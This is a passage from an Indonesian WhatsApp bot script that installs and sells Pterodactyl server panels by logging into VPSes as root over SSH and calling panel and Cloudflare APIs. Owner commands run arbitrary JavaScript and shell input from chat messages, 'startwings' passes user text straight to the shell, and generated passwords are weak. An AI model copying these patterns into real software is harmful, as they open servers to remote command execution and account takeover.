                if (data.toString().includes('Email address for the initial admin account')) {
                    stream.write('admin@gmail.com\n');
                } 
                if (data.toString().includes('Username for the initial admin account')) {
                    stream.write('admin\n');
                } 
                if (data.toString().includes('First name for the initial admin account')) {
                    stream.write('admin\n');
                } 
                if (data.toString().includes('Last name for the initial admin account')) {
                    stream.write('admin\n');
                } 
                if (data.toString().includes('Password for the initial admin account')) {
                    stream.write(`${passwordPanel}\n`);
                } 
                if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
                    stream.write(`${domainpanel}\n`);
                } 
                if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
                    stream.write('y\n')
                } 
                if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
                    stream.write('1\n');
                } 
                if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('(yes/no)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Still assume SSL? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Please read the Terms of Service')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('(A)gree/(C)ancel:')) {
                    stream.write('A\n');
                } 
                console.log('Logger: ' + data.toString());
            }).stderr.on('data', (data) => {
                m.reply(`Error Terjadi kesalahan :\n${data}`);
                console.log('STDERR: ' + data);
            });
        });
    }

    ress.on('ready', async () => {
        await m.reply(`*Memproses install server panel 🚀*\n\n` +
                     `*IP Address:* ${vii[0]}\n` +
                     `*Domain Panel:* ${domainpanel}\n\n` +
                     `Mohon tunggu 10-20 menit hingga proses install selesai`);
        
        ress.exec(deletemysql, async (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async (code, signal) => {
                await instalPanel();
            }).on('data', async (data) => {
                await stream.write('\t');
                await stream.write('\n');
                await console.log(data.toString());
            }).stderr.on('data', async (data) => {
                m.reply(`Error Terjadi kesalahan :\n${data}`);
                console.log('Stderr : ' + data);
            });
        });
    });

    ress.on('error', (err) => {
        console.error('SSH Connection Error:', err);
        m.reply(`Gagal terhubung ke server: ${err.message}`);
    });

    ress.connect(connSettings);
}
break

case "startwings":
case "configurewings": {
    if (!isCreator) return Reply(mess.owner);
    let t = text.split('|');
    if (t.length < 3) return Reply("Contoh: *.startwings* ipvps|pwvps|token_node");

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    let token = t[2].trim();

    const connSettings = {
        host: ipvps,
        port: 22,
        username: 'root',
        password: passwd
    };

    const command = `${token} && systemctl start wings`;

    const ress = new ssh2.Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) {
                m.reply('Gagal menjalankan perintah di VPS');
                ress.end();
                return;
            }

            stream.on('close', async (code, signal) => {
                await m.reply("*Berhasil menjalankan wings ✅*");
                ress.end();
            }).on('data', (data) => {
                console.log("STDOUT:", data.toString());
            }).stderr.on('data', (data) => {
                console.log("STDERR:", data.toString());
                // Opsi jika perlu input interaktif
                stream.write("y\n");
                stream.write("systemctl start wings\n");
                m.reply('Terjadi error saat eksekusi:\n' + data.toString());
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error:', err.message);
        m.reply('Gagal terhubung ke VPS: IP atau password salah.');
    }).connect(connSettings);
}
break;

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await mix.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

//=============================================//

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await mix.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//=============================================//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return mix.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//=============================================//

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await mix.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//=============================================//

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return mix.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//=============================================//

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await mix.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//=============================================//

case "payment": case "pay": {
const teksPayment = `
*Daftar Payment Mamix 🔖*

* *Dana :* 0895359670059
* *Ovo :* 088226579576
* *Gopay :* 0895359670059

*Penting!*
Wajib kirimkan bukti transfer demi keamanan bersama!
`
return mix.sendMessage(m.chat, {image: {url: "https://files.catbox.moe/uadqj0.jpg"}, caption: teksPayment}, {quoted: m})
}
break;

//=============================================//

case "subdo": case "subdomain": case "domain": { 
if (!isCreator) return Reply(mess.owner);
if (!text) {
    const obj = Object.keys(subdomain);
    let teks = `\n`;
    obj.forEach((domain, index) => {
        teks += `* ${index + 1}. ${domain}\n`;
    });
    teks += `\nContoh Penggunaan :\n *.domain* 2 host|ipvps\n`;
    return Reply(teks);
}

if (!args[0] || isNaN(args[0])) return Reply("Domain tidak ditemukan!");

const dom = Object.keys(subdomain);
const domainIndex = Number(args[0]) - 1;
if (domainIndex >= dom.length || domainIndex < 0) return Reply("Domain tidak ditemukan!");

if (!args[1] || !args[1].includes("|")) return Reply("Hostname/IP Tidak ditemukan!");

let tldnya = dom[domainIndex];
const [host, ip] = args[1].split("|").map(str => str.trim());

async function subDomain1(host, ip) {
    return new Promise((resolve) => {
        axios.post(
            `https://api.cloudflare.com/client/v4/zones/${subdomain[tldnya].zone}/dns_records`,
            {
                type: "A",
                name: `${host.replace(/[^a-z0-9.-]/gi, "")}.${tldnya}`,
                content: ip.replace(/[^0-9.]/gi, ""),
                ttl: 3600,
                priority: 10,
                proxied: false,
            },
            {
                headers: {
                    Authorization: `Bearer ${subdomain[tldnya].apitoken}`,
                    "Content-Type": "application/json",
                },
            }
        ).then(response => {
            let res = response.data;
            if (res.success) {
                resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
            } else {
                resolve({ success: false, error: "Gagal membuat subdomain." });
            }
        }).catch(error => {
            let errorMsg = error.response?.data?.errors?.[0]?.message || error.message || "Terjadi kesalahan!";
            resolve({ success: false, error: errorMsg });
        });
    });
}

let teks = `*Berhasil membuat subdomain ✅*\n\n*🚀 IP Address :* ${ip}\n`;
const domnode = `node${getRandom("")}.${host}`;

for (let i = 0; i < 2; i++) {
    let subHost = i === 0 ? host.toLowerCase() : domnode;
    try {
        let result = await subDomain1(subHost, ip);
        if (result.success) {
            teks += `*🌐 ${result.name}*\n`;
        } else {
            return Reply(result.error);
        }
    } catch (err) {
        return Reply("Error: " + err.message);
    }
}

await m.reply(teks);

}
break;

//=============================================//

case "backupsc":
case "bck":
case "backup": {
    if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber)
        return Reply(mess.owner);
    try {        
        const tmpDir = "./Tmp";
        if (fs.existsSync(tmpDir)) {
            const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
            for (let file of files) {
                fs.unlinkSync(`${tmpDir}/${file}`);
            }
        }
        await m.reply("Processing Backup Script . .");        
        const name = `Script-Mamix`; 
        const exclude = ["node_modules", "sessions", "package-lock.json", "yarn.lock", ".npm", ".cache"];
        const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

        if (!filesToZip.length) return Reply("Tidak ada file yang dapat di-backup.");

        execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

        await mix.sendMessage(m.sender, {
            document: fs.readFileSync(`./${name}.zip`),
            fileName: `${name}.zip`,
            mimetype: "application/zip"
        }, { quoted: m });

        fs.unlinkSync(`./${name}.zip`);

        if (m.chat !== m.sender) m.reply("Script bot berhasil dikirim ke private chat.");
    } catch (err) {
        console.error("Backup Error:", err);
        m.reply("Terjadi kesalahan saat melakukan backup.");
    }
}
break;

//=============================================//

case "self":
case "public": {
  if (!isCreator) return Reply(mess.owner);
  const mode = command === "public";
  mix.public = mode;
  return Reply(`✅ Bot berhasil beralih ke mode *${mode ? "public" : "self"}*.`);
}

//=============================================//

default:
if (m.text.toLowerCase() == "bot") {
m.reply("Online Kak ✅")
}

if (m.text.startsWith("=>")) {
    if (!isCreator) return Reply(mess.owner);

    try {
        const result = await eval(`(async () => { ${text} })()`);
        const output = typeof result !== "string" ? util.inspect(result) : result;
        return mix.sendMessage(m.chat, { text: util.format(output) }, { quoted: m });
    } catch (err) {
        return mix.sendMessage(m.chat, { text: util.format(err) }, { quoted: m });
    }
}

if (m.text.startsWith(">")) {
    if (!isCreator) return Reply(mess.owner);

    try {
        let result = await eval(text);
        if (typeof result !== "string") result = util.inspect(result);
        return mix.sendMessage(m.chat, { text: util.format(result) }, { quoted: m });
    } catch (err) {
        return mix.sendMessage(m.chat, { text: util.format(err) }, { quoted: m });
    }
}

if (m.text.startsWith('$')) {
    if (!isCreator) return Reply(mess.owner);
    
    exec(m.text.slice(2), (err, stdout) => {
        if (err) {
            return mix.sendMessage(m.chat, { text: err.toString() }, { quoted: m });
        }
        if (stdout) {
            return mix.sendMessage(m.chat, { text: util.format(stdout) }, { quoted: m });
        }
    });
}

}

} catch (err) {
console.log(err)
await mix.sendMessage(global.owner+"@s.whatsapp.net", {text: err.toString()}, {quoted: m})
}}

//=============================================//

process.on("uncaughtException", (err) => {
console.error("Caught exception:", err);
});

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.blue(">> Update File:"), chalk.black.bgWhite(__filename));
    delete require.cache[file];
    require(file);
});